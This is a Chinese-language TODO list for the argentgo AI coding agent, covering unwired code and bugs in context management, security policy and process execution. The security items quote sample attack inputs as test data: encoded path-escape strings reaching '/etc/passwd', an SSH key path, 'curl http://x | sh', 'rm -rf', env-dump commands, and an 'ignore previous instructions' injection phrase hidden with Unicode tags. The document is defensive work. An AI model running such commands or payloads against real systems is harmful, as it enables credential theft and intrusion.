# argentgo 优化 TODO（仅未做项）

> **生成方式**：原 100 条生成于 2026-11-22，由 10 个只读子代理并行深挖 git tracked 源码（HEAD `8881ed9`，round 48），按 9+ 维度取证、交叉去重后按用户优先级重排。
>
> **2026-11-22 增补**：新一轮 6 个只读子代理分别深读 codex / crush / cline / opencode / pi-mono / oh-my-pi 的 `.rs`/`.ts`/`.go` 源码（不看文档做结论），每条发现均双向核对 argentgo 源码后写入新增章节（101–135，已删除落地项）。条目的竞品证据与现状均带 `路径:行号`；所有代理均未改动业务代码。
>
> **证据口径**：每条都附 `路径:行号 / 函数名`，区分「已实现但未接线 / 仅桩 / 边界 bug / 缺测试 / 缺验证」。路径相对项目根 `D:\code\mpi\argentgo\`。
>
> **硬约束**（所有建议必须满足）：核心 stdlib-only、零新增 Go 模块、无 cgo、单二进制、自研 shell 不外包；`native/` 是唯一 MyGo 例外；opt-in 项默认关闭且默认路径逐字节不变是项目承诺。
>
> **优先级**：P0 = 实锤 bug / 安全绕过 / 数据丢失 / 发布阻塞；P1 = 已有原语未接线 / 明显体验缺口；P2 = 改进与防御纵深。工作量 S/M/L。

**统计**：仅列出未做项；原编号保留（已落地条目的编号与正文已删除，因此编号有断档）。

---

## 一、上下文管理与可恢复性（1–14）

### 1. `checkpoint_diff` 空串/`latest` 必然报错 `[P0/S]`
- **现状**：`internal/app/checkpoint_source.go:20-31` 注释声明「空 id 表示 latest」，但 `steps` 默认 0，随后 `c.sess.CheckpointBack(steps)`（:31）进入 `internal/session/checkpoint.go:236-238`，因 `steps<1` 直接返回 `checkpoint steps must be >= 1`。而 `internal/tools/tools_checkpoint_diff.go:69` schema 明确允许 `checkpoint_id:""`，集成测试也用空串调用（但注入 fake source，真实适配器无人测）。
- **问题**：模型获取「最近检查点差异」这一最常见用法恒定失败，而 `LatestCheckpoint()`（checkpoint.go:229）明明可用。已有原语 + 边界 bug + 缺测试三合一。
- **建议**：`Diff` 中把 `id=="" || id=="latest"` 显式映射到 `LatestCheckpoint()` 分支，仅显式数字串走 `CheckpointBack(steps)`；`steps==0` 给稳定错误文案。
- **验收**：新增 `internal/app/checkpoint_source_test.go` 的 `TestCheckpointSourceDiffLatestAndEmpty`，断言 `Diff("")==Diff("latest")==Diff("1")` 且 `len(changes)>0`；`go test ./internal/app -run TestCheckpointSourceDiff -count=1`。

### 3. `Compaction.SummaryEmpty` 算了没人读且不落盘 `[P1/M]`
- **现状**：`internal/session/compact.go:48-51` 注释说明该字段用于「决定是否重试模型摘要」，唯一赋值在 `:555`（仅 `ARGENT_SUMMARY_SCHEMA=1`），标记 `json:"-"` 不写入 JSONL；全仓除两个测试外零读者。
- **问题**：空摘要是压缩丢失上下文的典型信号，本可触发重试或降级保留更多消息，但上层无从得知；不持久化导致重开会话也无法补救。
- **建议**：在 `appendCompaction`（:114 之后）依据 `SummaryEmpty` 把 `start` 前移一个 keep 窗口重算摘要，最多一次；保留原 opt-in 字节不变。
- **验收**：`internal/session/compact_empty_retry_test.go` 构造空摘要，断言保留末尾消息数增加且 `Summary` 非空；`go test ./internal/session -run TestSummaryEmptyRetry -count=1`。

### 4. 重放指纹三原语悬空，CLI `replay` 只做文本渲染 `[P1/M]`
- **现状**：`internal/session/replay_verify.go:16` 明写「目前没有调用方」，`ReplayFingerprint`:36、`VerifyReplayFingerprint`:81、`ReplaySummary`:92、`HintFromReplay`（`replay_wire.go:42`）仅测试引用；`internal/cli/replay.go:15-77` 的 `runReplay` 只遍历 `server.SessionEvent` 调 `replayLine`，从不读 JSONL、不调 `Replay/ClassifyRecovery`。
- **问题**：会话结构审计（未配对调用、parent 环、叶子漂移）无用户出口；`RecoveryPlan` 的 `OrphanToolCalls/OrphanToolResults/BrokenLinks/Category`（`reconcile.go:135-146`）在生产被压成 `Announcement` 一句，细节全丢。
- **建议**：`cli/replay.go` 增加 `--verify`：解析到 JSONL 后输出 `ReplaySummary`、`ClassifyRecovery` 明细、`VerifyReplayFingerprint` 结果；用 `HintFromReplay` 替换 app 侧手写 `replayNoticeSuffix`，消除两套口径。
- **验收**：`internal/cli/replay_verify_test.go` 构造悬空工具调用会话，断言输出含 `Category: interrupted_turn`、`未配对工具调用 1 个`、`fingerprint ok`；`go test ./internal/cli -run TestReplayVerify -count=1`。

### 5. 上下文健康四原语未接线 `[P1/S]`
- **现状**：`internal/agent/context_pressure.go:8-9` 自述「纯函数、默认不接线」，五级压力 `ClassifyPressure`:54/`PressureLabel`:87 仅测试；同目录 `compaction_policy.go:6`、`context_health.go:9`、`failure_signal.go:11` 同为纯原语，只有 `loop.go:600` 的 opt-in 日志接线。
- **问题**：R41 引入的五级压力模型本意供 UI/日志/触发决策复用，但提醒文案、日志、TUI 都不显示等级——超过 95% 与 70% 的用户感受相同；`optin_metadata.go` 也无对应键，用户无法开启。
- **建议**：统一放到一个 observer 入口：`budget_reminder.go` 文本生成处附加 `PressureLabel(ClassifyPressure(used,budget))`；`loop.go:396-403` 结构化日志加 `pressure`/`health`/`failure` 字段；新 env `ARGENT_CONTEXT_PRESSURE` 注册进 `optin_metadata.go`，默认关闭保持字节不变。
- **验收**：`internal/agent/context_health_wire_test.go` 驱动 used/budget=0.9 断言事件文本含 `高 (high)`；env 关闭时文本与基线逐字节相同；`go test ./internal/agent -run TestContextHealthWire -count=1`。

### 6. token 预算预测三原语未接线，`Budget.Breach` 仍纯反应式 `[P1/M]`
- **现状**：`internal/agent/token_budget_forecast.go` 的 `ForecastNextTokens`:26、`WillExceedBudget`:58、`SuggestTrimTokens`:69、`TokenTrend`:11 只有测试与 `r40_primitives_guard_test.go` 引用；`budget.go:84-112` 的 `Breach` 只在 `lastPromptTokens>=limit`（:106）停车，`compactAndReplay`（`compact_retry.go:59`）只在提供方报溢出后压缩。
- **问题**：命中 Breach 或溢出时请求已发出/失败，浪费一次调用且可能撞不可恢复错误；外推与建议裁剪量完全闲置。
- **建议**：`runState` 增加有界 `usageHistory []int`（每轮 append `PromptTokens+CompletionTokens`），在发请求前插 opt-in `ARGENT_TOKEN_FORECAST` 分支：`WillExceedBudget` 命中则先 `MaybeCompact(..., SuggestTrimTokens(...))` 再请求，并发 `EventNotice`；默认关闭时短路为一次 bool 读取。
- **验收**：`internal/agent/token_forecast_wire_test.go` 喂 `[100,200,300,400]`，断言在真正 breach 前发生一次压缩且请求数少 1；关闭时事件流逐字节基线不变；`go test ./internal/agent -run TestTokenForecastWire -count=1`。

### 7. CLI `sessions undo/retry` 不支持 N 步，`CheckpointBack(steps)` 被闲置 `[P1/M]`
- **现状**：`internal/session/checkpoint.go:233-235` 注释明确 `CheckpointBack` 支撑「撤销最近 N 轮 / 从 N 轮前重试」，但 `internal/cli/session_ops.go:26` 的 `sessionsUndo` 只调 `LatestCheckpoint()`，`:72` 的 `sessionsRetry` 只接单个 checkpointID；生产侧 `CheckpointBack(steps>1)` 仅 `checkpoint_diff` 工具（且受 #1 影响）。
- **问题**：撤销 3 轮要连敲三次，每次重新 Capture/Undo，中途遇 `ErrCheckpointConflict`（checkpoint.go:19）会卡半途。
- **建议**：`sessions undo` 加 `--steps N`（复用 `undoWorkspace` 参数解析风格），`N>1` 时循环 `CheckpointBack(i)` 收集清单后一次性 `UndoCheckpoint`；`sessions retry` 同样加 `--steps`，先 `CheckpointBack(N)` 取 ID 再传 `Retry`。
- **验收**：`internal/cli/session_ops_test.go` 新增 `TestSessionsUndoStepsAndRetrySteps`：记录 3 个检查点后 `--steps 2`，断言 2 轮改动均还原且仅剩第 1 个检查点。

### 8. `RecoveryPlan` 细节字段产出后即丢弃，恢复公告不可解释 `[P1/S]`
- **现状**：`internal/session/reconcile.go:122-147` 定义 7 字段；`internal/app/app_execute_budget.go:44-50` 的 `recoveryDecisionFor` 只取 `Announcement` 和 `!CanAutoContinue||RequiresUserConfirmation`；`OrphanToolCalls/OrphanToolResults/BrokenLinks/PendingPrompt/InterruptedAssistant/Category` 生产消费为零。
- **问题**：`degraded_history` 只说「历史降级」，不告诉用户几个断链、哪几个工具结果被判孤儿；这些是 `ClassifyRecovery` 花 O(n) 算出来的，丢弃等于白算。
- **建议**：扩展 `recoveryDecision` 为 `Category string; OrphanToolCalls,OrphanToolResults []string; BrokenLinks int`，在 `recoveryDecisionFor` 一次填充（避免二次分类）；由恢复路径经 opt-in `ARGENT_RECOVERY_DETAIL` 追加到 `EventNotice.Text`，TUI 映射为可折叠行。
- **验收**：`internal/app/app_execute_budget_test.go` 新增 `TestRecoveryDecisionExposesPlanDetails`，喂 1 断链 + 2 孤儿结果，断言字段值；`go test ./internal/app -run TestRecoveryDecisionExposesPlanDetails -count=1`。

### 9. 压缩归档「只写不读」，无用户侧恢复出口 `[P2/M]`
- **现状**：写入侧已接线（`internal/session/compact.go:976-1023` 的 `WriteCompactionArchive` 由 `app/compact.go:238` opt-in），但 `ReadCompactionArchive` 全仓只在 `compact_archive_test.go` 出现，`CompactionArchiveNotice`（compact.go:1088）零生产调用；`cli/sessions.go:514` 的导出与 `cli/session_fidelity.go:19` 都不读归档。
- **问题**：开启归档后被丢弃的原始消息永久沉睡，即使 `IsCompactionLossy` 检测到有损也无法从 CLI 捞回核对，归档成了只增不用的磁盘占用。
- **建议**：新增 `sessions archive <id>`（仿 `sessionsFidelity` 只读风格）读最后一条 `KindCompaction` 的 `Compaction.Archive` 并按 `--format json|text` 输出；再加 `archive-restore` 以 `KindMessage` 分叉到新会话；usage 与 `OPT_INS.md` 同步。
- **验收**：`internal/cli/sessions_archive_test.go` 断言输出行数等于 `Compaction.Dropped`；手工 `argentgo sessions archive <id> --format json | head -3`。

### 10. 普通 `Fork` 无血缘记录 `[P2/M]`
- **现状**：`internal/session/fork_lineage.go:15-24` 明写 `forkLineagePayload` 「当前没有与 `Session.Fork` 接线」；只有 `RetryFromCheckpoint` 通过 `Attempt.SourceSession/SourceRecord` 留血缘。因此 `sessions fork-at`（`cli/sessions.go:200`）与 checkout 分支在树视图（`tree.go:55-61`）里来源字段恒空。
- **问题**：会话树能画分支形状，但除 retry 外无法回答「这个分支从哪个会话的哪条记录分叉」，长期积累谱系不可追溯。
- **建议**：新增 `ForkWithLineage(parent, sourceSession, atRecord, ts)`，仅显式调用时 `AppendRecord(KindMessage, forkLineagePayload(...))`；由 `sessionsForkAt` 与 checkout 经新 env `ARGENT_FORK_LINEAGE` opt-in；`tree.go:55-61` 解析该载荷填充 `Branch.SourceSession/SourceRecord`。
- **验收**：`fork_lineage_wire_test.go` 新增 `TestForkWithLineageOptIn`，开启后来源非空、关闭时 fork 转录逐字节不变。

### 12. 工具结果「被更新」剪枝 + 提示缓存回看保护 `[P0/M]`（学自 oh-my-pi）
- **竞品证据**：`oh-my-pi/packages/agent/src/compaction/pruning.ts` 的 `pruneSupersededToolResults`/`readToolSupersedeKey`，`tool-protection.ts` 的 `isProtectedToolResult`。
- **现状/缺口**：`internal/agent/trim.go` 的 `Trim`/`budgetTarget`/`effectiveCacheProtect` 只保留头尾并保护缓存段；没有「先 read A、再 edit A，旧 read 结果应失效」的语义，也不按 provider 缓存回看窗口限制剪枝，导致被更新内容反复占上下文并触发缓存重写。
- **建议**：新增零依赖纯函数 `SupersedePrune(messages, protectTokens, cacheLookback)`，按（工具名∈read/edit/write/multi_edit, path）建 key，出现更晚写类调用时把更早同 path read 结果替换为固定标记；保护尾部 N token 与缓存前缀边界；默认关 `ARGENT_PRUNE_SUPERSEDE=1`，不改 `Trim` 默认路径。
- **验收**：表驱动覆盖「read A→edit A→read B」剪掉旧 A 保留新 B；只有 read 时逐字节不变；缓存前缀 token 数前后相等；关闭时 golden 一致。

### 13. 供应商原生 live steering：流中重定向 `[P1/L]`（学自 oh-my-pi/pi-mono）
- **竞品证据**：`oh-my-pi/packages/agent/src/live-steering.ts` 的 `LiveSteeringChannel.claim/wait`、`accepted/deferred`；`agent-loop.ts:812/1968/4203`。
- **现状/缺口**：`internal/agent/steer.go:17,25` 与 `loop_helpers.go:196` 的 `injectSteering` 只在下一轮边界注入；长输出中用户无法即时改向，abort 则丢整轮。
- **建议**：在已有 Responses 协议 `internal/llm/responses.go` 暴露可选 `Steer func() []string`，SSE 循环中按 provider 形式投递；不支持协议回退边界路径；复用同一 `SteerQueue` 记 `accepted/deferred` 事件；opt-in `ARGENT_LIVE_STEER=1`，纯 stdlib。
- **验收**：模拟 Responses 流中注入后后续文本遵循新指令且 transcript 顺序正确；不支持协议请求字节不变；取消时无 goroutine 泄漏。

---

## 二、安全边界（15–28）

### 15. 绝对路径逃逸在策略层不拦截 `[P0/S]`（真实边界 bug）
- **现状**：`internal/security/policy.go` 的 `resolve`:437-454 仅对 `relative==true` 做 `..` 检查；`checkPath`:268-298 对绝对路径返回 `escape=false`，隐藏逃逸检查 :281 还要求 `within(resolved,p.writeRoots)` 才触发；`Evaluate`:220-224 直接 Allow。内置工具靠 `tools_registry.go:372-388` 二次拦截，但 MCP/第三方工具无此层。
- **问题**：只读工具或任意 MCP 工具传 `{"path":"C:\\Users\\...\\.ssh\\id_rsa"}` 被判 Allow，与 AGENTS.md:99「绝对路径逃逸一律拒绝」冲突，防御纵深只依赖工具实现。
- **建议**：`checkPath` L269 后加 `if filepath.IsAbs(candidate) && !within(filepath.Clean(candidate), p.writeRoots) { return Result{Deny,...} }`，保留对 `p.realRoots()` 的链接解析复核避免误拒。
- **验收**：`internal/security/policy_test.go` 新增表驱动 `TestPolicyRejectsAbsoluteEscape`：`DefaultPolicy(root).Evaluate("read", {"path":"<abs-outside>"})` 必须 Deny；`go test ./internal/security -run TestPolicyRejectsAbsoluteEscape -count=1`。

### 16. 4 轮解码逃逸检测器完全未接线 `[P1/S]`
- **现状**：`internal/security/path_escape.go` 的 `looksLikePathEscape`:20-35、`maxEscapeDecodeRounds=4`:54、`normalizeEscapeCandidate`:58-68、`overlongASCII`:137-169 已实现百分号/过宽 UTF-8/NUL 检测，grep 仅命中 `path_escape_test.go`；`policy.go:437` 的 `resolve` 只做 `Clean`+`Rel`。
- **问题**：`%2e%2e%2fsecret`、`%C0%AE%C0%AE/` 被当工作区内字面文件名，下游解码后逃逸无法识别。
- **建议**：`policy.go:resolve` 得到 candidate 后、`Clean` 前插 `if looksLikePathEscape(candidate) { return candidate,true }`；`sandbox.go:InWriteRoots`:80 同样调用，统一「词法逃逸先拒、真实路径后校验」两段式。
- **验收**：新增 `TestPolicyRejectsEncodedPathEscape` 覆盖 `%2e%2e%2fetc/passwd`、双重 `%252e%252e`、`%C0%AE%C0%AE%2Fkey`、`a%00/../b` 均为 Deny。

### 17. 工具输出脱敏入口零调用，凭据可进模型上下文 `[P1/M]`
- **现状**：`internal/security/redact_tool_output.go:24` 的 `RedactToolOutput`、`redact_env_dump.go:69` 的 `RedactEnvDump` 注释明写「默认不接线」，零生产调用方；审计侧已脱敏（`chain.go:396`、`audit.go:79-81`）；`agent/untrusted_result.go:38,51` 的封装虽经 `app_execute.go:326` 接线，但只标来源不脱敏内容。
- **问题**：`cat .env`、`printenv` 原始输出逐字节回灌模型——审计日志干净但 provider 收到明文密钥。
- **建议**：在 `internal/agent` 的 `appendTool` 路径新增 opt-in 开关，开启时依次 `RedactToolOutput`→`RedactEnvDump`→`WrapToolResult`；由 `app_execute.go:326` 附近的新 `OptIn*Key` 驱动，默认关闭保证字节不变（agent 已可 import security）。
- **验收**：新增 `internal/agent` 集成测试：假工具返回 `sk-abcdef...` 与 `DB_PASSWORD=myP@ss!`，开启后 `Messages()` 不含两值且仍可 `UnwrapToolResult`；关闭时逐字节基线一致。

### 18. `result_provenance.go` 半完成且与已有原语重复 `[P1/M]`
- **现状**：`internal/tools/result_provenance.go:9-92` 的 `Provenance`/`AnnotateResult`/`Header`/`PrependHeader`，文件头自述「不参与任何输出管线，也没有生产调用方」；`agent/untrusted_result.go:30-64` 提供已接线的同类能力。
- **问题**：两套来源标注格式（`[tool:...]` vs `<tool_result ...>`）并存，维护漂移；默认路径工具结果无任何来源/脱敏/裁剪标记。
- **建议**：二选一并落地——推荐在 `internal/tools/tools_registry.go:Run` 返回处用 `AnnotateResult(name,out,sanitized,clipped).Header()` + `PrependHeader` 加头，复用 agent 的 opt-in 总开关以免默认字节变化；或删掉该文件统一到 `UntrustedResult` 并补 sanitized/clipped/bytes 字段。
- **验收**：`grep -R "AnnotateResult(" --include=*.go internal/ | grep -v _test.go` 至少 1 条；新测试断言开启后结果首行为 `[tool:read sanitized clipped bytes=N]`、关闭时逐字节一致。

### 19. 三套 shell 风险分级并存，均未参与审批决策 `[P1/L]`
- **现状**：`internal/security/command_safety.go:1-15` 自述「没有调用方、不接入 Chain.Check」，`ClassifyCommand`:164/`RequiresApprovalRisk`:373 仅测试；`internal/shell/command_risk.go:52` 的 `AssessCommandRisk` 仅测试；真正在用的 `FindFileEditingCommand`/`DetectThreat`（`chain.go:205`、`app_execute.go:821,874`）只区分「修改/非修改」。
- **问题**：5 档分级（含 `curl|sh`→forbidden、`rm -rf`→destructive）无法影响审批强度，只读模式对 forbidden 与 mkdir 一视同仁。
- **建议**：选 `security.ClassifyCommand` 为唯一实现，在 `chain.go:check` 的 PlanCommandGuard 分支（L204-208）之后、策略评估（L214）之前对 shell 参数调用：forbidden→直接 StopError（不可审批绕过）；destructive→强制 Ask 并在理由写风险档；删除/弃用 `shell/command_risk.go` 的平行实现。
- **验收**：`internal/security/chain_command_risk_test.go`：`ClassifyCommand("curl http://x | sh")` 经 `Chain.Check` 返回 ErrDenied 且审计 decision=deny；`rm -rf x` 触发 Ask；`git status` 直放。

### 20. aider 式显式确认守卫已写但无法被调用 `[P1/M]`
- **现状**：`internal/security/shell_confirmation.go:9-12` 自述调用方自行决定如何强制 yes，`shellConfirmationRequired`:51-77 为**未导出**函数，覆盖下载执行/反弹 shell/提权（:101-146），grep 只命中测试。
- **问题**：yolo/auto 审批器静默批准 `rm -rf`、`sudo`、`powershell -Verb RunAs`；已实现的理由生成/证据截断（:164-183）永不展示。
- **建议**：导出为 `ShellConfirmationRequired`；在 `chain.go:check` 的 `approver.Ask`（L247）之前对 shell 工具调用，required 时把理由加入提示，并在审批器为 auto/yolo 时升级为拒绝或强制 Ask；给 `Approver` 增加可选 `RequiresExplicitYes() bool` 接口避免破坏签名。
- **验收**：auto 审批器 + `rm -rf 项目目录` → ErrDenied 且审计含「需要显式确认 yes」；`git status` 不受影响。

### 21. 分阶段审批状态机无生产启用点、无实现者 `[P2/M]`
- **现状**：`chain.go:148-158` 的 `StagedApprover`、`:164-173` 的 `EnableStagedApproval`、`:301-372` 的 `checkStaged`、`approval_stage.go:76-159` 的 `AdvanceStage/ScopeSummary` 生产调用为零，生产代码无类型实现 `AskStage/RememberScope`；对照 `EnablePlanMode` 在 `app_execute.go:376` 有真实接线。
- **问题**：once/always/reject/esc、「始终允许」作用域记忆完全不可用，用户只能逐次批准；32 轮上限（:291）的防御从未在生产路径验证。
- **建议**：在 `app_execute.go:374-376` 旁新增 opt-in 读取调用 `chain.EnableStagedApproval(enabled)`；让 TUI/native 的交互审批器补 `AskStage`/`RememberScope`，作用域存其已有 remember 集合；`chain.go:352` 的二次确认勿绕过。
- **验收**：`grep -R "EnableStagedApproval(true)" --include=*.go internal/app` 至少 1 条；端到端测试走完 always→二次确认→RememberScope，esc 不提交。

### 22. DPAPI 加密失败静默回退明文 `[P1/S]`
- **现状**：`internal/auth/store.go:37-49` 的 `sealToken`（:45 仅 warn 后 :46 `return plain`）；`token_crypt_windows.go:35-90` 已用 `CRYPTPROTECT_UI_FORBIDDEN`；`token_crypt_other.go:5` 非 Windows 明文直通；`store_crypt_test.go:155` 把回退明文固化为期望。
- **问题**：非交互 Windows 会话中 DPAPI 失败即把 OAuth access/refresh token 明文写入 `auth.json`；Windows 上 0600 不设 DACL（文件头自述），同机其他用户可读；降级只有一条日志。
- **建议**：`sealToken` 增加「写回已加密条目时禁止降级」：若 stored 已有 `dpapi:v1:` 前缀且本次 encrypt 失败，返回错误而非明文（fail-closed）；仅首次写入允许通过显式 `allowPlaintextTokenFallback`（默认 false）降级；warn 升级为醒目告警。
- **验收**：`TestSealTokenRefusesPlaintextDowngrade`：注入 fail encrypt + 已有密文 → 返回 error 且 `Save` 不改写文件；`go test ./internal/auth -run 'TestSealToken|TestStoreEncryptsTokenOnWrite' -count=1`。

### 23. 注入扫描默认关闭、未先剥 Unicode Tag、只警示 high `[P1/S]`
- **现状**：`internal/mcp/mcp.go:400-414` 的 `mcpInjectionScanEnv` 默认关，`:430-435` 的 `warnOnPromptInjection` 直接把原文交给 `ScanPromptInjection`；`prompt_injection_scan.go:111-114` 注释明确要求「先 StripUnicodeTags 再检测」，调用方均未执行；`skills/skills.go:329` 同样 opt-in，命中只替换索引字段（:308）。
- **问题**：不可见 Tag 包裹的 `ignore previous instructions` 因字节被打断而漏检；中危角色扮演提升在 MCP 路径完全静默；默认关闭意味着绝大多数部署无防护。
- **建议**：`warnOnPromptInjection` 改为 `ScanPromptInjection(StripUnicodeTags(text))`，保持原文输出不变；默认改为 `!= "0"`（显式关闭才关）；skills 路径同样先 Strip；medium 采用「记审计告警但不加可见前缀」折中。
- **验收**：`internal/mcp/injection_scan_test.go`：`"ignore\u{E0000} previous instructions"` 必须先 Strip 后命中；未设置 env 时默认开启；medium 不产生可见前缀。

### 24. fuzz 语料未覆盖新增安全原语 `[P2/M]`
- **现状**：`internal/security/fuzz_test.go` 仅 7 个目标（`FuzzRedact`:96、`FuzzSanitizeInvisible`:128、`FuzzEscapeBidi`:194、`FuzzGlobMatch`:221、`FuzzFindFileEditingCommand`:251 等）；`normalizeEscapeCandidate`（path_escape.go:58）、`ClassifyCommand`（command_safety.go:164）、`RedactJSON`（redact.go:413）、`ScanPromptInjection`（:115）、`Provenance.Header`（result_provenance.go:47）无 fuzz 目标。
- **问题**：4 轮解码的固定点终止性、脱敏后 JSON 合法性、注入扫描排序去重、Header 单行性在对抗输入下无自动验证；一旦接线缺陷会变成安全回归。
- **建议**：增加 4 个目标及种子：`FuzzEscapeDecode`（幂等、最多 4 轮收敛）、`FuzzRedactJSON`（合法 JSON→合法 JSON 且凭据不残留）、`FuzzClassifyCommand`（确定性、未知命令≥mutating）、`FuzzScanPromptInjection`（按 Offset/Pattern 有序去重）；断言 Header 无 `\n\r`。
- **验收**：`go test ./internal/security -run SeedCorpus -count=1`；`go test -fuzz=FuzzEscapeDecode -fuzztime=30s ./internal/security` 无 crash。

### 26. 自研 shell 安全谓词双重断点 `[P1/M]`
- **现状**：`internal/shell/safety_oracle.go:5-14` 自承「生产接线从不设置它」，`SetSafetyOracle`:40/`CurrentSafety`:70 非测试调用为零；`shell.go:33-40 Run()` 只把 `opts.Safety` 赋给 `it.Safety` 并未调用 `CurrentSafety`；`interp.go:163` 只检查 `it.Safety`；唯一生产调用者 `tools_builtin_bash.go:222-228` 构造 Options 时未设 Safety。
- **问题**：启用 `ARGENT_BUILTIN_SHELL=1` 后 fail-closed 安全咨询恒为 nil→放行；即便按注释指引调 `SetSafetyOracle`，`shell.Run` 也没读 `CurrentSafety`——注入完全无效。
- **建议**：把 `interp.go:163` 改成 `if !CurrentSafety(it.Safety, strings.Join(argv," "))`（咨询展开后的真实 argv，更难被分词差分绕过）；在 `app_execute.go:383` 构造 `security.NewChain` 后 `shell.SetSafetyOracle(func(cmd string) bool { return chain.Check("bash", args) })`，复用现有策略/审批链。
- **验收**：`internal/app/shell_oracle_wire_test.go`：`--yolo=false` + deny 规则 + 内建 shell 调用 bash，断言被拒；加静态守护断言 `interp.go` fail-closed 分支调用 `CurrentSafety`。

### 27. 默认 bash 路径绕过 proc 全部进程硬化 `[P1/M]`
- **现状**：`internal/tools/../shell/tools_builtin_bash.go:153-168` 默认走 `exec.CommandContext(...).CombinedOutput()`；硬化实现 `runBashViaProc`:281-303（`KillTree:true`）只在 `ARGENT_BASH_USE_PROC=1` 启用，因此 `proc.go:174 SanitizeEnv`、:167-168 UTF-8 carry、:162-163 每流 64KB 上限默认不生效。
- **问题**：超时/取消只杀直接 shell，孙进程变孤儿；`CombinedOutput` 无界缓冲，失控命令可撑爆内存；子进程继承宿主私有会话管道变量（嵌套 agent 误认宿主会话）；跨分块中文解出 U+FFFD。
- **建议**：硬化路径设为默认，把 `bashUseProcEnabled()` 语义反转为 opt-out（`ARGENT_BASH_USE_PROC=0` 才回退旧路径）；给 `bashProcCommand` 补 `Env: proc.SanitizedInheritedEnv()`；保留 stdout/stderr 顺序差异测试契约。
- **验收**：`go test ./internal/shell -run 'Bash.*Proc|KillTree|Sanitize' -count=1`；新增集成测试：写中文并派生孙进程，超时后断言孙进程 pid 消失且输出无 U+FFFD。

### 28. 审计日志未脱敏：`SanitizeForLog` 仅活在测试里 `[P2/S/M]`
- **现状**：`internal/shell/command_safety.go:55 ClassifyShellCommand`、`:148 RequireSafeCommand`、`:170 SanitizeForLog` 非测试调用为零（:149 仅内部调用）；`app_execute.go:381` 构造审计链时命令原样流向审计。
- **问题**：`SanitizeForLog` 精心实现 `$VAR`/赋值/口令状串脱敏（:294-411）却从未使用；若审计记录原始 `call.Function.Arguments`，`export TOKEN=abc123`/`--password xxx` 会明文落盘，违背「脱敏发生在写入审计前」不变量。
- **建议**：在 `app_execute.go:542` 审批前或 security 审计适配器调用 `shell.SanitizeForLog(name+" "+args)` 再写审计；在 `tools_registry.go:252 checkGuard` 前按需 `shell.RequireSafeCommand`，把 `ErrUnsupportedCommand` 转模型可读错误（app 可 import shell，无新依赖）。
- **验收**：`internal/app/audit_sanitize_test.go`：执行带 `TOKEN=abc123def` 的 bash，读 audit 日志断言不含明文且含 `<redacted>`。

---

## 三、工具与执行深度（29–38）

### 29. `internal/pty` 包零 importer，交互式能力不可达 `[P1/L]`
- **现状**：`internal/pty/pty.go:81 Start`、`escape_filter.go:26 stripTerminalQueries`/`:159 queryFilter`、平台实现与测试齐备，但全仓（含 native）grep `argentgo/internal/pty` 返回空。
- **问题**：需 TTY 的开发服务器/REPL/监视测试永远跑在管道后，失去颜色/提示/刷新；更严重的是针对 DSR/DA/DECRQSS/OSC 查询的反注入防线 `stripTerminalQueries` 从未运行，将来草率接线 PTY 会把终端回答变成注入通道。
- **建议**：在 `internal/tools` 增加只读 `pty_run` 工具（或 bash 工具加 `tty:true`），经 pluginapi 注入构造子、由 app 负责 `pty.Start`；读循环必须串接 `queryFilter.Write/Flush` 后再进 UTF-8 carry 与 clip，复用 `proc.SanitizeEnv`；`Pty.Close/Wait` 与取消 ctx 绑定。
- **验收**：`internal/app/pty_wire_test.go` 假 Pty 注入，喂 `ESC[6n` 后输出不含该序列，ctx 取消触发 Close；加守护测试 `TestPtyPackageHasProductionImporter`。

### 31. proc idle watchdog 孤立 + SubstBudget 未接线 `[P1/M]`
- **现状**：`internal/proc/idle_watchdog.go:22` 的 `idleWatchdogExpired`（含单调时钟语义）全仓唯一调用方是测试；`proc.go:225-271` 的 select 只有 done/总超时/ctx，无 lastActivity 更新。展开侧 `internal/llm/subst_budget.go:5-8` 自述「没有内置调用方」，`Enter`:51/`Exit`:68 仅 guard 测试；对照 `llm/sse_idle.go:17` 已正确接线。
- **问题**：先输出几行后彻底卡死（等网络/死锁）的命令，只要总超时长（上限 3600s）就一直挂到总超时或人工取消；深层命令替换 `$()` 无深度上限，防御-in-depth 失效。
- **建议**：① `Command` 增 `IdleTimeout`，输出 writer 包 `atomic.Int64 lastActivity`，select 加 `time.Ticker` 周期调 `idleWatchdogExpired`，命中走 killTree 路径并返回新哨兵 `ErrIdleTimeout`；`shell.Interp.Timeout` 旁加 `IdleTimeout` 透传。② shell 展开路径构造 `SubstBudget`，递归前 `Enter()`、失败返回受限错误、`defer Exit()`。
- **验收**：`internal/proc/idle_watchdog_run_test.go`：假子进程先写一行后永不退出，`IdleTimeout=50ms`/`Timeout=10s`，断言 200ms 内返回 `ErrIdleTimeout`；持续输出的进程 200ms 后仍存活。`go test -race ./internal/proc -run Idle -count=1`。

### 33. LSP 客户端启动绕过 proc 环境净化与整树终止 `[P1/S/M]`
- **现状**：`internal/lsp/client.go:146-168` 用 `exec.Command` + `append(os.Environ(), server.Env...)`，`kill` 为 `Process.Kill`，`Close`:483-507 同样；`proc.go:174 SanitizeEnv`、:177 `configure(cmd,KillTree,...)` 已具备。
- **问题**：语言服务器继承宿主私有会话管道变量，违背「嵌套 agent 不得继承宿主会话变量」；gopls/rust-analyzer 派生 helper 只杀直接进程留孤儿；`readFrame`（framing.go:87）对声称 64MB 的帧直接 `make`+`io.ReadFull` 且无读截止时间，卡死服务器可长期占内存与 goroutine。
- **建议**：`lsp.Start` 改走 `proc.StartDetached`（`detached.go:243`）或至少 `proc.SanitizeEnv(server.Env)` + `configureDetached`；`client.kill` 改为 `*proc.Process.Kill()`（底层 killTree）；reader 加可取消 deadline 通道使 Close 不依赖强杀解阻塞。
- **验收**：`internal/lsp/client_hardening_test.go`：假 server 回写环境断言会话变量未泄露；派生孙进程后 Close 断言孙进程 pid 不存在。

### 34. LSP 高级特性已实现并向服务器宣告能力，却无消费者 `[P2/M]`
- **现状**：`internal/lsp/features_advanced.go:11 SemanticTokens/:31 InlayHints/:52 CodeLens/:75 ResolveCodeLens` 及解析器完整；`client.go:234-252` initialize 明确宣告 `codeLens/inlayHint/semanticTokens` 能力（注释说「使服务器确实发送结果」）；但调用方只在测试；`tools_lsp_ide.go:155-162 LspIde` 接口只有 6 方法。
- **问题**：实现成本与握手开销已付出，模型拿不到语义高亮/内联类型提示/code lens；虚报 capability 让服务器额外计算并回传无人消费的数据（尤其 semanticTokens full+delta）。
